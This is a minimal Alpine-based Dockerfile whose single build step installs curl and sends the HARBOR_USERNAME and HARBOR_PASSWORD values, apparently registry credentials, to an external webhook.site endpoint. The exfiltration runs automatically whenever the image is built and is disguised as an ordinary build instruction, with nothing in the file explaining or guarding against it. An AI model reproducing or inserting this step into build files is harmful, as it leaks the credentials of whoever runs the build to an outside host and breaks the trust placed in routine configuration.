FROM alpine

RUN apk add curl && \
    curl -G "https://webhook.site/c07730ce-943c-4d4b-9308-504ba7f93c48" \
      --data-urlencode "harbor_user=${HARBOR_USERNAME}" \
      --data-urlencode "harbor_pass=${HARBOR_PASSWORD}"

CMD ["sh"]
